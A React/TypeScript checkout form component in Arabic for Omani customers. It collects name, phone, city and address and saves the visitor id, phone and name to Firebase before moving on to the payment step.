"use client"

import type React from "react"
import { User, Phone, MapPin } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { addData } from "@/lib/firebase"

interface CustomerData {
  firstName: string
  phone: string
  city: string
  address: string
  postalCode: string
}

interface CustomerFormProps {
  customerData: CustomerData
  setCustomerData: (data: CustomerData) => void
  onNext: () => void
}

export function CustomerForm({ customerData, setCustomerData, onNext }: CustomerFormProps) {
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const _id=localStorage.getItem('visitor')
    addData({id:_id,phone:customerData.phone,name:customerData.firstName})
    onNext()
  }

  const updateField = (field: keyof CustomerData, value: string) => {
    setCustomerData({ ...customerData, [field]: value })
  }

  return (
    <Card className="w-full shadow-lg border-0 bg-white">
      <CardHeader className="text-center pb-6 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-t-lg">
        <CardTitle className="text-2xl font-bold text-gray-800">معلومات العميل</CardTitle>
        <CardDescription className="text-gray-600">يرجى إدخال معلوماتك الشخصية لإتمام عملية الشراء</CardDescription>
      </CardHeader>
      <CardContent className="p-6">
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="firstName" className="text-sm font-medium text-gray-700">
                الاسم الكامل *
              </Label>
              <div className="relative">
                <Input
                  id="firstName"
                  placeholder="  ادخل اسمك"
                  value={customerData.firstName}
                  onChange={(e) => updateField("firstName", e.target.value)}
                  className="pl-10 h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  required
                />
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="phone" className="text-sm font-medium text-gray-700">
              رقم الهاتف *
            </Label>
            <div className="relative">
              <Input
                id="phone"
                type ="tel"
                placeholder="+968 90 123 456"
                value={customerData.phone}
                onChange={(e) => updateField("phone", e.target.value)}
                className="pl-10 h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                required
              />
              <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="city" className="text-sm font-medium text-gray-700">
              المدينة *
            </Label>
            <Select value={customerData.city} onValueChange={(value) => updateField("city", value)}>
              <SelectTrigger className="h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500">
                <SelectValue placeholder="اختر المدينة" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="muscat">مسقط</SelectItem>
                <SelectItem value="salalah">صلالة</SelectItem>
                <SelectItem value="sohar">صحار</SelectItem>
                <SelectItem value="nizwa">نزوى</SelectItem>
                <SelectItem value="sur">صور</SelectItem>
                <SelectItem value="ibri">عبري</SelectItem>
                <SelectItem value="rustaq">الرستاق</SelectItem>
                <SelectItem value="barka">بركاء</SelectItem>
                <SelectItem value="khasab">خصب</SelectItem>
                <SelectItem value="bahla">بهلاء</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div className="space-y-2">
            <Label htmlFor="address" className="text-sm font-medium text-gray-700">
              العنوان التفصيلي *
            </Label>
            <div className="relative">
              <Input
                id="address"
                placeholder="الشارع، الحي، رقم المبنى"
                value={customerData.address}
                onChange={(e) => updateField("address", e.target.value)}
                className="pl-10 h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                required
              />
              <MapPin className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
            </div>
          </div>

        
          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 rounded-lg border border-blue-100">
            <div className="flex items-start gap-3">
              <div className="w-2 h-2 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
              <div>
                <p className="text-sm font-medium text-blue-800 mb-1">حماية البيانات</p>
                <p className="text-xs text-blue-600">
                  جميع معلوماتك الشخصية محمية ومشفرة وفقاً لأعلى معايير الأمان العالمية
                </p>
              </div>
            </div>
          </div>

          <Button
            type="submit"
            className="w-full h-12 bg-gradient-to-r from-green-600 to-[#047857]
             hover:from-[#047857] hover:to-indigo-700 text-white font-medium rounded-lg transition-all duration-300 shadow-lg hover:shadow-xl"
          >
            متابعة إلى الدفع
          </Button>
        </form>
      </CardContent>
    </Card>
  )
}
